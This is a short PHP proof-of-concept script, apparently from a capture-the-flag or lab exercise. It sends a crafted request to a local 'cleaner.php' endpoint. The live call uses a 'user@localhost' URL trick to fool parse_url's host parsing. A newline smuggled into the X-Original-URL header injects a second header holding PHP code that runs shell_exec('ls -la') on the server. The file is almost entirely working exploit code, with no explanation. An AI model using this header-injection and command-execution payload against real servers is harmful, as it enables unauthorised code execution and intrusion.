<?php
	function clean_and_send($url){
			$uncleanedURL = $url; // should be not used anymore
			echo $uncleanedURL."\n";
			$values = parse_url($url);
			print_r($values);
			$host = explode('/',$values['host']);
			print_r($host);
			$query = $host[0];
			print($query."\n");
			$data = array('host'=>$query);
			$cleanerurl = "http://127.0.0.1/cleaner.php";
   			$stream = file_get_contents($cleanerurl, true, stream_context_create(['http' => [
			'method' => 'POST',
			'header' => "X-Original-URL: $uncleanedURL",
			'content' => http_build_query($data),
			// 'proxy' => 'tcp://127.0.0.1:8080',
			// 'request_fulluri' => true,
			]
			]));
    		echo $stream;
	}
	/*clean_and_send("https://www.example.tld/cleanmepls?name=joe&age=13&address=very-very-very-long-string");*/
	clean_and_send("https://www.example.tl@localhost
X-Visited-Before: echo shell_exec(\"ls -la\");");
?>
